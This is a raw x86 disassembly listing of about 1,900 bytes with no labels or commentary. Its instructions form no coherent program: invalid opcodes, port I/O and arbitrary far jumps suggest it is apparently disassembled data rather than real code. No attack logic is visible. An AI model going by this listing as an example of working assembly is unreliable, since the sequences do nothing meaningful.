  408aef:	adc    ch,BYTE PTR [ebx-0x7a]
  408af2:	pop    edx
  408af3:	mov    esi,0x4d6ee7d2
  408af8:	mov    ds:0x15d2a129,al
  408afd:	dec    ebp
  408afe:	xor    edx,0xdee2025e
  408b04:	xchg   ecx,eax
  408b05:	outs   dx,BYTE PTR ds:[esi]
  408b06:	pop    ebx
  408b07:	cld    
  408b08:	in     al,dx
  408b09:	push   edi
  408b0a:	mov    dl,0x43
  408b0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b0d:	fidiv  WORD PTR [eax]
  408b0f:	test   BYTE PTR [edx-0x38],dl
  408b12:	add    al,0x78
  408b14:	ds leave 
  408b16:	sub    ecx,DWORD PTR [eax-0x64a5aed5]
  408b1c:	xchg   ecx,eax
  408b1d:	fstp   QWORD PTR [eax-0x779a2da9]
  408b23:	sub    BYTE PTR [edx+0xfd3d07a],0x7b
  408b2a:	ins    DWORD PTR es:[edi],dx
  408b2b:	cmp    eax,0x585b3212
  408b30:	and    ebx,esp
  408b32:	sahf   
  408b33:	(bad)  
  408b34:	clc    
  408b35:	shl    BYTE PTR [esp+eax*4-0x1b],cl
  408b39:	push   ecx
  408b3a:	push   ecx
  408b3b:	ins    BYTE PTR es:[edi],dx
  408b3c:	aas    
  408b3d:	sub    DWORD PTR [ecx+eax*4],esi
  408b40:	retf   0x67a7
  408b43:	jmp    0x408b97
  408b45:	out    0x6c,eax
  408b47:	frstor [edx+0x23]
  408b4a:	mov    BYTE PTR [esi],dl
  408b4c:	loope  0x408ada
  408b4e:	je     0x408adb
  408b50:	jecxz  0x408b63
  408b52:	pop    edx
  408b53:	inc    edx
  408b54:	or     al,0x1c
  408b56:	call   0xeb84:0xb5682ec9
  408b5d:	dec    edi
  408b5e:	iret   
  408b5f:	or     BYTE PTR [ebx+0x21],al
  408b62:	es pop edx
  408b64:	sub    eax,0x2b851c97
  408b69:	jbe    0x408b96
  408b6b:	test   eax,0xcd725d9e
  408b70:	push   es
  408b71:	stc    
  408b72:	(bad)  
  408b73:	mov    ch,BYTE PTR [esi]
  408b75:	(bad)  
  408b77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b78:	ds ret 
  408b7a:	pop    DWORD PTR ds:0xd4d803b0
  408b80:	mov    ds:0x3fb53c5f,eax
  408b85:	ror    DWORD PTR [ebx],0xdb
  408b88:	mov    edx,0x3ed22520
  408b8d:	popf   
  408b8e:	lods   al,BYTE PTR ds:[esi]
  408b8f:	ret    0x2fe2
  408b92:	inc    eax
  408b93:	in     al,dx
  408b94:	cmc    
  408b95:	loopne 0x408b77
  408b97:	adc    DWORD PTR [eax+0x1f],eax
  408b9a:	enter  0x2fba,0xd8
  408b9e:	fistp  DWORD PTR [eax]
  408ba0:	cmp    ah,BYTE PTR [ecx+0x1fcbd96f]
  408ba6:	popa   
  408ba7:	dec    ebp
  408ba8:	pop    ds
  408ba9:	mov    ss,WORD PTR [esi+0x5]
  408bac:	adc    bh,ch
  408bae:	inc    BYTE PTR [ebp-0x4aa15ea1]
  408bb4:	aas    
  408bb5:	jno    0x408be8
  408bb7:	ins    BYTE PTR es:[edi],dx
  408bb8:	das    
  408bb9:	outs   dx,DWORD PTR ds:[esi]
  408bba:	pop    esi
  408bbb:	scas   al,BYTE PTR es:[edi]
  408bbc:	inc    ebp
  408bbd:	out    0x72,al
  408bbf:	pop    ebx
  408bc0:	xor    dl,BYTE PTR [edx+0x7d]
  408bc3:	sar    edi,cl
  408bc5:	sbb    ch,BYTE PTR ds:0x5b0e6fec
  408bcb:	inc    eax
  408bcc:	fxch   st(5)
  408bce:	xchg   DWORD PTR [edx+0x669cec30],esi
  408bd4:	jecxz  0x408be4
  408bd6:	nop
  408bd7:	call   0x85610cca
  408bdc:	call   0xdf349fd4
  408be1:	pop    ss
  408be2:	pop    edx
  408be3:	bound  ebx,QWORD PTR [esi+0x20abe84d]
  408be9:	cmp    dl,BYTE PTR [eax]
  408beb:	cdq    
  408bec:	aas    
  408bed:	sbb    DWORD PTR [eax-0x1f],edi
  408bf0:	mov    ds:0x5c927e06,eax
  408bf5:	out    0x21,al
  408bf7:	dec    esi
  408bf8:	mov    ebx,0xda2ad5ab
  408bfd:	out    0x94,al
  408bff:	dec    DWORD PTR [ebp-0x73bd305]
  408c05:	repnz xor BYTE PTR [edi+0x385a4676],al
  408c0c:	push   0x27
  408c0e:	adc    BYTE PTR [esi+0x52],al
  408c11:	fbstp  TBYTE PTR [esp+eax*4+0xd45ba5f]
  408c18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c19:	dec    edi
  408c1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c1b:	cmp    eax,0x846b2d76
  408c20:	dec    ebp
  408c21:	sbb    bh,BYTE PTR [edx-0x7c]
  408c24:	js     0x408c06
  408c26:	inc    eax
  408c27:	jle    0x408c9f
  408c29:	jp     0x408c30
  408c2b:	cwde   
  408c2c:	mov    esi,0xc6ea7dea
  408c31:	adc    esi,DWORD PTR [ecx+0x5c272bfd]
  408c37:	cmp    ch,bh
  408c39:	hlt    
  408c3a:	gs push edi
  408c3c:	jg     0x408bc1
  408c3e:	push   ecx
  408c3f:	arpl   ax,cx
  408c41:	mov    al,bl
  408c43:	hlt    
  408c44:	aaa    
  408c45:	jle    0x408ca1
  408c47:	(bad)  
  408c48:	(bad)  [esi+ebp*2]
  408c4b:	cld    
  408c4c:	push   0xd1006614
  408c51:	sti    
  408c52:	fld    TBYTE PTR [eax]
  408c54:	xor    bh,ah
  408c56:	lock stos BYTE PTR es:[edi],al
  408c58:	pop    es
  408c59:	push   ecx
  408c5a:	cmp    eax,0xfa40fe
  408c5f:	and    dh,ah
  408c61:	rcr    DWORD PTR [edx-0x80],1
  408c64:	rcr    DWORD PTR [edx+0x31],cl
  408c67:	dec    ebp
  408c68:	and    al,0xf4
  408c6a:	xchg   esp,eax
  408c6b:	test   eax,ebp
  408c6d:	adc    DWORD PTR [ebp+0x6b],esp
  408c70:	aas    
  408c71:	sub    ecx,DWORD PTR [ebx+0x5]
  408c74:	mov    bl,0xb6
  408c76:	clc    
  408c77:	sub    eax,eax
  408c79:	out    0xbc,al
  408c7b:	ja     0x408cd9
  408c7d:	retf   0x4cef
  408c80:	mov    WORD PTR [ebx-0x7f],?
  408c83:	ret    0x64f5
  408c86:	pop    edx
  408c87:	pop    esp
  408c88:	and    ch,BYTE PTR [ebx]
  408c8a:	bound  edi,QWORD PTR [edi-0x22a6464a]
  408c90:	mov    edx,0xf58aaa7f
  408c95:	out    0xc7,eax
  408c97:	inc    esi
  408c98:	adc    DWORD PTR [esi+eiz*4+0x5b1c7205],esp
  408c9f:	call   0x4d27436a
  408ca4:	pop    cx
  408ca6:	test   DWORD PTR [edx-0x7f8c789b],ecx
  408cac:	mov    ?,eax
  408cae:	or     eax,DWORD PTR [ecx]
  408cb0:	imul   esp,edi,0x2d
  408cb3:	cmp    BYTE PTR [ebp+0x62c0f4b8],cl
  408cb9:	sahf   
  408cba:	fdivr  DWORD PTR [edx]
  408cbc:	and    BYTE PTR [eax-0x4d],cl
  408cbf:	std    
  408cc0:	loopne 0x408cbb
  408cc2:	cmp    al,0xbb
  408cc4:	stc    
  408cc5:	mov    dh,0xda
  408cc7:	jo     0x408cd8
  408cc9:	xchg   esi,eax
  408cca:	push   ds
  408ccb:	rol    edx,1
  408ccd:	push   edi
  408cce:	pop    ebx
  408ccf:	xor    al,0xef
  408cd1:	fld    DWORD PTR [edx+0x6e]
  408cd4:	add    dl,BYTE PTR [eax]
  408cd6:	mov    dh,ch
  408cd8:	pop    esi
  408cd9:	push   eax
  408cda:	push   esp
  408cdb:	in     al,0x96
  408cdd:	popf   
  408cde:	nop
  408cdf:	add    al,0x30
  408ce1:	jecxz  0x408c74
  408ce3:	sbb    DWORD PTR [ecx-0x37],ecx
  408ce6:	mov    eax,0xfaa907fa
  408ceb:	mov    bh,0x16
  408ced:	pop    esi
  408cee:	stos   DWORD PTR es:[edi],eax
  408cef:	xchg   ebp,ecx
  408cf1:	imul   BYTE PTR [esp+esi*4+0x25642897]
  408cf8:	aas    
  408cf9:	shl    DWORD PTR [edx+0x4cc9e1dd],0xb8
  408d00:	sbb    al,0xe8
  408d02:	and    al,0x2b
  408d04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d05:	outs   dx,DWORD PTR ds:[esi]
  408d06:	icebp  
  408d07:	pop    esi
  408d08:	aam    0x24
  408d0a:	out    dx,eax
  408d0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d0c:	adc    dl,BYTE PTR [ebx-0x1cc1a7df]
  408d12:	repz js 0x408d91
  408d15:	pop    eax
  408d16:	add    eax,0xc187b5e0
  408d1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d1c:	fidivr DWORD PTR [ecx]
  408d1e:	jecxz  0x408ca4
  408d20:	int3   
  408d21:	jp     0x408d10
  408d23:	and    edi,DWORD PTR [edi]
  408d25:	loope  0x408d15
  408d27:	push   esp
  408d28:	add    BYTE PTR [esi+ebp*2-0x48],bl
  408d2c:	jmp    0xf0bf:0x3f151456
  408d33:	jmp    0x408d8d
  408d35:	in     al,dx
  408d36:	retf   0x3ef7
  408d39:	mov    bl,0xc6
  408d3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d3c:	mov    dl,0xb0
  408d3e:	cld    
  408d3f:	add    edi,DWORD PTR [edx]
  408d41:	out    0x74,al
  408d43:	mov    edx,fs
  408d45:	test   al,0xdb
  408d47:	jae    0x408d1f
  408d49:	adc    eax,0xe0640bd2
  408d4e:	mul    BYTE PTR es:[ecx]
  408d51:	dec    esi
  408d52:	call   0xb8be5700
  408d57:	mov    dh,0xda
  408d59:	scas   al,BYTE PTR es:[edi]
  408d5a:	repnz xor esp,ecx
  408d5d:	cwde   
  408d5e:	xor    al,0x5
  408d60:	imul   eax,DWORD PTR [eax],0x5b
  408d63:	mov    es,WORD PTR [edx-0x24af66b9]
  408d69:	dec    ebp
  408d6a:	fwait
  408d6b:	push   esp
  408d6d:	mov    ch,0x5b
  408d6f:	push   esp
  408d70:	push   ecx
  408d71:	cwde   
  408d72:	shl    ebx,0x3a
  408d75:	out    0x1c,eax
  408d77:	addr16 call 0x660c9368
  408d7d:	shl    BYTE PTR [edi+0x71],1
  408d80:	cmp    ebx,esp
  408d82:	pop    ebx
  408d83:	call   0x8c387ebc
  408d88:	push   eax
  408d89:	xchg   esp,eax
  408d8a:	add    BYTE PTR [edi+eiz*1+0x3fd4b6fc],0x87
  408d92:	rcr    BYTE PTR [edx+0x74752d52],1
  408d98:	sbb    esp,edi
  408d9a:	bound  esp,QWORD PTR [edi-0x6c]
  408d9d:	push   ds
  408d9e:	add    ah,BYTE PTR [ebx+0x3b]
  408da1:	aad    0x31
  408da3:	xchg   edx,eax
  408da4:	mov    DWORD PTR [ebx+ebx*2-0x68],esp
  408da8:	in     eax,0x2d
  408daa:	sub    eax,0xa8756890
  408daf:	test   BYTE PTR [ebx+eiz*2+0x6c],bl
  408db3:	jle    0x666da224
  408db9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dba:	cmp    DWORD PTR [eax+0x39476728],0x7da112ff
  408dc4:	mov    dh,0x6e
  408dc6:	aam    0x85
  408dc8:	jo     0x408d5e
  408dca:	movaps xmm0,XMMWORD PTR [ebp+0xb]
  408dce:	push   esp
  408dcf:	push   cs
  408dd0:	arpl   WORD PTR [ebx+eax*2],di
  408dd3:	test   DWORD PTR [eax+0x79],eax
  408dd6:	sbb    BYTE PTR [ebp-0x7a36b7b0],0xeb
  408ddd:	push   edi
  408dde:	xor    DWORD PTR [edi-0x226b5cee],esp
  408de4:	dec    DWORD PTR ss:[ebp+0x7cbe2e]
  408deb:	je     0x408daa
  408ded:	out    0x9a,al
  408def:	test   BYTE PTR [esi+0x51],0x74
  408df3:	add    edx,ebp
  408df5:	ja     0x408ddc
  408df7:	xchg   DWORD PTR [edx-0x6693a4b5],ebp
  408dfd:	add    edi,DWORD PTR [ecx]
  408dff:	ja     0x408df1
  408e01:	fisttp DWORD PTR [esi]
  408e03:	test   esp,ebx
  408e05:	jle    0x408e63
  408e07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e08:	aas    
  408e09:	inc    edi
  408e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e0b:	inc    esp
  408e0c:	cmp    dh,BYTE PTR [ecx]
  408e0e:	pop    eax
  408e0f:	rcl    DWORD PTR [ebp-0x1b],0x40
  408e13:	xor    cl,bl
  408e15:	cmp    BYTE PTR [ebx-0x70faee2b],al
  408e1b:	sbb    dh,BYTE PTR ds:0x2a4d5ccd
  408e21:	adc    BYTE PTR [ebp+0x4c],al
  408e24:	in     al,0x74
  408e26:	cld    
  408e27:	add    al,0x7f
  408e29:	jecxz  0x408e65
  408e2b:	push   esi
  408e2c:	adc    ecx,DWORD PTR [edi+0x60]
  408e2f:	or     bh,bh
  408e31:	inc    esp
  408e32:	cmp    cl,BYTE PTR [edi+0x3f]
  408e35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e36:	shl    BYTE PTR [ebp-0x718d7044],cl
  408e3c:	out    dx,al
  408e3d:	out    0xbc,eax
  408e3f:	gs das 
  408e41:	sbb    DWORD PTR [ebx],ebx
  408e43:	xchg   DWORD PTR [edi],ebp
  408e45:	push   eax
  408e46:	mov    eax,ds:0x5b8694f2
  408e4b:	xchg   esi,eax
  408e4c:	dec    eax
  408e4d:	popa   
  408e4e:	cmp    DWORD PTR [ecx-0x7e],eax
  408e51:	dec    ebx
  408e52:	push   edx
  408e53:	test   ebx,eax
  408e55:	mov    bh,0xcc
  408e57:	ret    0x2b3a
  408e5a:	mov    ch,0xef
  408e5c:	test   BYTE PTR [ebx+0x1e],ah
  408e5f:	inc    edx
  408e60:	add    DWORD PTR [edi+0x4a],0x5
  408e64:	out    dx,al
  408e65:	xor    BYTE PTR [eax-0x7c],cl
  408e68:	pop    esp
  408e69:	shr    DWORD PTR [ebx-0x5c],1
  408e6c:	ja     0x408eb1
  408e6e:	push   esi
  408e6f:	lahf   
  408e70:	ds ja  0x408dfa
  408e73:	xchg   edi,eax
  408e74:	xchg   edx,edx
  408e76:	test   BYTE PTR [edx-0x226edfd0],dl
  408e7c:	shl    BYTE PTR [edi-0x5177a36],cl
  408e82:	das    
  408e83:	mov    eax,0x246266da
  408e88:	xchg   ecx,eax
  408e89:	in     eax,0xda
  408e8b:	push   0xffffffda
  408e8d:	out    0x80,eax
  408e8f:	pop    es
  408e90:	arpl   bx,cx
  408e92:	(bad)  
  408e93:	std    
  408e94:	mov    al,ds:0x75373e6b
  408e99:	mov    DWORD PTR [ebx-0x5e],ebx
  408e9c:	jno    0x408ee4
  408e9e:	(bad)  
  408e9f:	or     BYTE PTR [ebx+0x0],al
  408ea2:	cmp    al,BYTE PTR [esi+eax*1]
  408ea5:	sbb    ch,0xff
  408ea8:	inc    ebx
  408ea9:	es dec ebp
  408eab:	dec    edx
  408eac:	jg     0x408e71
  408eae:	out    dx,eax
  408eaf:	test   DWORD PTR [eax-0x30902d1a],eax
  408eb5:	js     0x408e78
  408eb7:	pop    ecx
  408eb8:	adc    eax,0x79ee092e
  408ebd:	frstor [edi+0x14]
  408ec0:	mov    esi,0x3201611c
  408ec5:	cmp    DWORD PTR [edx+0x38e7cd80],ebp
  408ecb:	in     al,0xb5
  408ecd:	cdq    
  408ece:	shl    DWORD PTR [ecx+0x5a74aae3],0xb1
  408ed5:	xor    bl,BYTE PTR [ebx+0x76]
  408ed8:	das    
  408ed9:	inc    esp
  408eda:	not    BYTE PTR [edx]
  408edc:	pop    edx
  408edd:	ss adc al,0x85
  408ee0:	xor    DWORD PTR [esi-0x36c07408],0xffffffcb
  408ee7:	sbb    al,0xa2
  408ee9:	pushf  
  408eea:	pop    esp
  408eeb:	into   
  408eec:	inc    ecx
  408eed:	ret    
  408eee:	pop    esp
  408eef:	(bad)
  408ef2:	pop    edx
  408ef3:	mov    eax,ds:0xca7a3ce3
  408ef8:	cmp    eax,0x49319667
  408efd:	inc    edx
  408efe:	mul    BYTE PTR [esi+eax*4+0x76e3e1bc]
  408f05:	mov    ds:0x58ba844d,eax
  408f0a:	dec    ecx
  408f0b:	out    dx,al
  408f0c:	inc    ebx
  408f0d:	stc    
  408f0e:	add    edi,DWORD PTR [edi-0x7b8b3d0a]
  408f14:	mov    esi,0x86f635f0
  408f19:	or     al,0xb9
  408f1b:	in     al,0xc7
  408f1d:	pop    ss
  408f1e:	add    edx,DWORD PTR [eax-0x28]
  408f21:	inc    ecx
  408f22:	push   ebp
  408f23:	mov    dh,0xfe
  408f25:	sbb    esi,0xffffffab
  408f28:	xor    eax,0x378bd2c0
  408f2d:	out    0xfe,al
  408f2f:	nop
  408f30:	jecxz  0x408f93
  408f32:	(bad)  
  408f33:	arpl   WORD PTR ds:0x5d94e89d,si
  408f39:	int    0x80
  408f3b:	jo     0x408eea
  408f3d:	call   0x5368b51c
  408f42:	cmp    BYTE PTR [ecx-0xf4f83c1],bl
  408f48:	test   BYTE PTR [edx-0x1487b508],ch
  408f4e:	inc    edi
  408f4f:	sub    al,0x67
  408f51:	xchg   esi,eax
  408f52:	test   eax,0x3ae4fe45
  408f57:	push   0x93eb59f6
  408f5c:	jg     0x408fbc
  408f5e:	fnsave [ebx+0x21]
  408f61:	test   DWORD PTR [ebx],0x1e9e12ee
  408f67:	cld    
  408f68:	(bad)  
  408f69:	into   
  408f6a:	pop    ebx
  408f6b:	push   eax
  408f6c:	dec    esi
  408f6d:	out    0xf8,al
  408f6f:	loope  0x408f56
  408f71:	adc    BYTE PTR [esi+0x7e6aecde],bh
  408f77:	imul   edi,DWORD PTR ds:0x8be1ab53,0xd
  408f7e:	fwait
  408f7f:	sub    esp,DWORD PTR [ebp-0x2faa279c]
  408f85:	out    0x9a,al
  408f87:	sub    bl,BYTE PTR [edx]
  408f89:	jge    0x408fc1
  408f8b:	or     DWORD PTR [eax+0x5c],0xbbab3958
  408f92:	pop    ebx
  408f93:	lods   al,BYTE PTR ds:[esi]
  408f94:	sub    ah,ch
  408f96:	in     al,0xcd
  408f98:	or     ch,ah
  408f9a:	push   ebx
  408f9b:	test   ah,ch
  408f9d:	aaa    
  408f9e:	sbb    DWORD PTR [ebx+0x3f],edx
  408fa1:	inc    edi
  408fa2:	(bad)  
  408fa4:	clc    
  408fa5:	lea    ecx,[edx]
  408fa7:	jb     0x409013
  408fa9:	out    0x46,al
  408fab:	dec    edx
  408fac:	cld    
  408fad:	xchg   ebx,eax
  408fae:	pop    ebp
  408faf:	xor    al,0x0
  408fb1:	xor    BYTE PTR [edi],0x1b
  408fb4:	jmp    0x408fe1
  408fb6:	pop    ebx
  408fb7:	bnd jg 0x408f6d
  408fba:	mov    bl,BYTE PTR [esi-0x7aece8b8]
  408fc0:	hlt    
  408fc1:	jae    0x409019
  408fc3:	stc    
  408fc4:	xor    ecx,ecx
  408fc6:	sbb    al,0x62
  408fc8:	sub    eax,0x3135b9ed
  408fcd:	adc    edx,edi
  408fcf:	cmp    DWORD PTR [esi],edi
  408fd1:	adc    al,0xa7
  408fd3:	mov    ecx,0x867759d8
  408fd8:	xchg   BYTE PTR [esi],dl
  408fda:	mov    bh,0x3
  408fdc:	aas    
  408fdd:	jae    0x408f83
  408fdf:	cli    
  408fe0:	js     0x408ff4
  408fe2:	ret    
  408fe3:	mov    ecx,0x5475661e
  408fe8:	(bad)  
  408fe9:	imul   esi
  408feb:	sub    eax,DWORD PTR [edi-0x25]
  408fee:	aad    0xba
  408ff0:	ss (bad) 
  408ff2:	mov    gs,WORD PTR [edx-0x4fa5fac8]
  408ff8:	sbb    cl,dh
  408ffa:	mov    bl,BYTE PTR [ebp+0x13]
  408ffd:	mov    ds:0xd3b2387a,eax
  409002:	pop    ebx
  409003:	dec    ecx
  409004:	aas    
  409005:	leave  
  409006:	pop    ecx
  409007:	mov    eax,ds:0x82ae8e5d
  40900c:	push   esp
  40900d:	xchg   ecx,eax
  40900e:	or     dh,BYTE PTR [ebx-0x24cc40c3]
  409014:	mov    eax,ds:0x97f12989
  409019:	jecxz  0x409069
  40901b:	xor    eax,0xb05bf75d
  409020:	mov    dl,0x42
  409022:	sbb    BYTE PTR [edx-0x12],dh
  409025:	fsub   QWORD PTR [edx]
  409027:	(bad)  
  409028:	and    eax,0x37277166
  40902d:	push   cs
  40902e:	imul   DWORD PTR [eax+0x10]
  409031:	mov    al,0x59
  409033:	or     cl,BYTE PTR [esi-0x39]
  409036:	(bad)  
  409037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409038:	add    esp,edi
  40903a:	bnd jg 0x408ff4
  40903d:	mov    al,ds:0x8e987607
  409042:	mov    ds:0x556ac355,al
  409047:	mov    bh,bh
  409049:	imul   ebx,DWORD PTR [eax],0x6
  40904c:	lock inc edi
  40904e:	adc    ah,ch
  409050:	jno    0x409038
  409052:	mov    dl,0x23
  409054:	push   0x4c
  409056:	mov    bl,0x86
  409058:	jmp    0x6427b44e
  40905d:	rcr    BYTE PTR [ecx+0x20],1
  409060:	jb     0x40909d
  409062:	sub    dh,al
  409064:	mov    ecx,0x3eefba9e
  409069:	ins    BYTE PTR es:[edi],dx
  40906a:	jl     0x4090c8
  40906c:	inc    ebp
  40906d:	pop    ebx
  40906e:	mov    ecx,0xbab33070
  409073:	mov    esp,DWORD PTR [eax]
  409075:	push   ds
  409076:	sbb    BYTE PTR [ebx],dl
  409078:	pop    edx
  409079:	aam    0x9a
  40907b:	je     0x409069
  40907d:	mov    ds:0x337c849b,al
  409082:	pushf  
  409083:	push   ss
  409084:	aas    
  409085:	adc    DWORD PTR [ebx],edi
  409087:	rol    BYTE PTR [ecx+0x5b],cl
  40908a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40908b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40908c:	call   0xa602:0x20087813
  409093:	test   DWORD PTR [edi+0x3fb4eadd],ebx
  409099:	mov    ds:0xbdff6bdd,eax
  40909e:	daa    
  40909f:	push   eax
  4090a0:	out    0xe6,eax
  4090a2:	or     bh,dl
  4090a4:	and    eax,0x1207f4c9
  4090a9:	inc    eax
  4090aa:	jl     0x409066
  4090ac:	sbb    bl,0x45
  4090af:	adc    dh,bh
  4090b1:	ins    BYTE PTR es:[edi],dx
  4090b2:	sub    DWORD PTR [esp+edx*8-0x17],eax
  4090b6:	in     al,0x81
  4090b8:	fcom   DWORD PTR [eax]
  4090ba:	adc    esp,esp
  4090bc:	jmp    0xdf67:0x8bcb4de6
  4090c3:	dec    ebx
  4090c4:	mov    ds:0xdcce4c42,eax
  4090c9:	mov    cl,0x26
  4090cb:	test   BYTE PTR [eax+0x38fff01d],dh
  4090d1:	push   es
  4090d2:	fwait
  4090d3:	test   ebx,ebp
  4090d5:	jg     0x4090b1
  4090d7:	jb     0x409116
  4090d9:	mov    ecx,0x7cb676b8
  4090de:	stos   BYTE PTR es:[edi],al
  4090df:	push   ebp
  4090e0:	fdivr  QWORD PTR ds:0xcb064a3d
  4090e6:	sbb    cl,dh
  4090e8:	dec    edi
  4090e9:	out    0x9c,eax
  4090eb:	inc    edx
  4090ec:	cmp    BYTE PTR [edx+0x61],ah
  4090ef:	jg     0x40912f
  4090f1:	cdq    
  4090f2:	mov    edi,0xf25c470a
  4090f7:	lods   al,BYTE PTR ds:[esi]
  4090f8:	mov    al,ds:0xd915d4e6
  4090fd:	pusha  
  4090fe:	jmp    0x40916f
  409100:	ror    DWORD PTR [esi+0x35f907b9],cl
  409106:	pop    ebx
  409107:	aam    0xd7
  409109:	ret    0xbd20
  40910c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40910d:	int3   
  40910e:	mov    esp,0x1a9ec84
  409113:	add    DWORD PTR [esi],edi
  409115:	dec    ebp
  409116:	stos   BYTE PTR es:[edi],al
  409117:	jl     0x4090a9
  409119:	inc    edx
  40911a:	cmp    eax,0xe2e042a7
  40911f:	shl    DWORD PTR [eax],cl
  409121:	cwde   
  409122:	xor    eax,0xd890597b
  409127:	iret   
  409128:	ins    BYTE PTR es:[edi],dx
  409129:	push   ds
  40912a:	jmp    0x4090e3
  40912c:	and    ebx,eax
  40912e:	mov    al,0x18
  409130:	dec    edx
  409131:	out    0x79,al
  409133:	call   FWORD PTR [ebp-0x65cafa70]
  409139:	pop    ss
  40913a:	add    ebx,DWORD PTR [eax-0x3f46c242]
  409140:	xchg   esi,eax
  409141:	retf   0xed97
  409144:	aad    0x3
  409146:	imul   esp,DWORD PTR [edi-0x7da5bcaf],0x33
  40914d:	pop    eax
  40914e:	fdiv   DWORD PTR [esi]
  409150:	stos   DWORD PTR es:[edi],eax
  409151:	out    0x3e,al
  409153:	pop    ebp
  409154:	inc    ebx
  409155:	adc    eax,0x131b7dc2
  40915a:	pop    ecx
  40915b:	test   BYTE PTR [ebp*2-0x68f4a7a8],dh
  409162:	dec    ebp
  409163:	call   0x3c3790f
  409168:	imul   eax,edi,0x8168ebe
  40916e:	sbb    esi,DWORD PTR [ecx-0x15]
  409171:	clc    
  409172:	pop    edx
  409173:	push   esp
  409174:	fcomp  st(6)
  409176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409177:	je     0x40914d
  409179:	popa   
  40917a:	loop   0x409101
  40917c:	in     eax,0x17
  40917e:	pop    es
  40917f:	xor    BYTE PTR [esi],bh
  409181:	scas   eax,DWORD PTR es:[edi]
  409182:	xor    DWORD PTR [ebp-0x5a],ecx
  409185:	ss xchg ecx,eax
  409187:	mov    ds:0x2c44fb5a,eax
  40918c:	sahf   
  40918d:	sbb    ah,ah
  40918f:	mov    ch,0x3a
  409191:	sbb    al,bl
  409193:	lds    esi,FWORD PTR [edi]
  409195:	call   0x5620:0xe9eb6474
  40919c:	rol    BYTE PTR [edx-0x11554701],1
  4091a2:	ins    BYTE PTR es:[edi],dx
  4091a3:	test   BYTE PTR [edx-0x4db8ff19],bh
  4091a9:	out    dx,eax
  4091aa:	mov    ebp,esi
  4091ac:	xor    bh,BYTE PTR [edi]
  4091ae:	popf   
  4091af:	xor    BYTE PTR [edi],dl
  4091b1:	rcr    BYTE PTR [edx-0x58],0xd2
  4091b5:	fdivr  st(1),st
  4091b7:	aas    
  4091b8:	jg     0x4091a0
  4091ba:	outs   dx,BYTE PTR ds:[esi]
  4091bb:	push   ecx
  4091bc:	mov    dl,0x8c
  4091be:	jge    0x4091e7
  4091c0:	and    al,0x38
  4091c2:	xor    bl,BYTE PTR [ebp+0x3f]
  4091c5:	ja     0x409172
  4091c7:	and    eax,0xa63ea5d5
  4091cc:	mov    ch,0xe6
  4091ce:	outs   dx,BYTE PTR ds:[esi]
  4091cf:	lock data16 mov ah,0x14
  4091d3:	stc    
  4091d4:	inc    esi
  4091d5:	mov    WORD PTR [eax+0x33],es
  4091d8:	and    edx,ebp
  4091da:	pop    ebx
  4091db:	cmp    dl,BYTE PTR [ecx+esi*8]
  4091de:	pusha  
  4091df:	pop    edi
  4091e0:	out    0x7c,al
  4091e2:	cmp    al,BYTE PTR [eax-0x57fb2bad]
  4091e8:	int    0xa1
  4091ea:	(bad)  
  4091ec:	test   al,0x7e
  4091ee:	push   ebx
  4091ef:	lock (bad) 
  4091f1:	push   0xffffffc2
  4091f3:	sub    al,0xdf
  4091f5:	popa   
  4091f6:	pop    ebx
  4091f7:	jle    0x409222
  4091f9:	sbb    ebp,DWORD PTR [ebp-0x14]
  4091fc:	inc    ebp
  4091fd:	mov    bh,0xbf
  4091ff:	xchg   ebx,eax
  409200:	xchg   ebx,eax
  409201:	and    eax,0xb89d845c
  409206:	add    BYTE PTR [ecx-0x38],ah
  409209:	jmp    0x579a161c
  40920e:	stos   BYTE PTR es:[edi],al
  40920f:	jns    0x409250
  409211:	popa   
  409212:	(bad)  
  409213:	xor    edi,DWORD PTR ss:0x1eafdb19
  40921a:	daa    
  40921b:	mov    esp,0xbed7210c
  409220:	cmp    BYTE PTR [edi+0x3a],bh
  409223:	std    
  409224:	mov    ch,0xd
  409226:	pop    ecx
  409227:	in     al,dx
  409228:	jne    0x40920f
  40922a:	fwait
  40922b:	shr    DWORD PTR [edi+0x1],1
  40922e:	pop    ebx
  40922f:	mov    eax,0x2182d081
  409234:	mov    esi,0x33843e75
  409239:	push   ds
  40923a:	shr    dl,1
  40923c:	ds xchg edi,eax
  40923e:	lods   eax,DWORD PTR ds:[esi]
  40923f:	int    0x1b
  409241:	sub    al,BYTE PTR [esi+0x47]
  409244:	(bad)  
  409245:	stc    
  409246:	shl    BYTE PTR [edx+0x101f3899],0xa0
  40924d:	pop    ss
  40924e:	and    al,BYTE PTR [ebp+edi*4+0x3991df6f]
  409255:	xchg   edx,eax
  409256:	and    BYTE PTR [esi],bh
  409258:	and    DWORD PTR [edi-0x4fa67a11],edi
  40925e:	xlat   BYTE PTR ds:[ebx]
  40925f:	cmp    DWORD PTR [eax],edx
  409261:	enter  0x8246,0xe9
  409265:	sub    eax,0xb2a35e9e
  40926a:	inc    ebp
  40926b:	stc    
  40926c:	pop    ss
  40926d:	ret    0xc7db
  409270:	aas    
  409271:	inc    edi
  409272:	call   0xf2066927
  409277:	lods   eax,DWORD PTR ds:[esi]
  409278:	hlt    
  409279:	out    0xf4,eax
  40927b:	add    edx,DWORD PTR [edi+0x16]
  40927e:	addr16 leave 
  409280:	fcmovu st,st(5)
  409282:	or     eax,0x44caaf00
  409287:	push   es
  409288:	xchg   BYTE PTR ds:0xe685c518,bh
  40928e:	into   
  40928f:	(bad)  
  409291:	loope  0x4092c6
